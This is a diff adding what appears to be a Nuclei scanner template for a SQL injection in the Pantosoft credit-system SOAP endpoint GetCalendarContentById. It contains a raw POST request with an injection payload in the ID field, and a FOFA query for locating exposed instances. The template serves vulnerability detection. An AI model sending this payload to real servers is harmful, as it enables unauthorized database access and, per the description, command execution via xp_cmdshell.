@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 转换成数据类型 int 时失败
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /WebService_PantoSchool.asmx HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: text/xml; charset=utf-8
+
+          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+            <soapenv:Header/>
+              <soapenv:Body>
+                <tem:GetCalendarContentById>
+                  <!--type: string-->
+                  <tem:ID>1' OR 1 IN (SELECT @@version) AND '1'='1</tem:ID>
+                </tem:GetCalendarContentById>
+              </soapenv:Body>
+          </soapenv:Envelope>
+id: xuefenzhi-GetCalendarContentById-sql-injection
+info:
+    author: Superhero
+    description: |-
+        fofa: body="www.pantosoft.com" && body="Pantosoft Corporation" || icon_hash="-1632820573"
+        学分制系统 GetCalendarContentById 实例处存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+    name: 学分制系统 GetCalendarContentById SQL注入
+    reference:
+        - https://superhero.blog.csdn.net/article/details/139843702
+    severity: high
+    tags: []
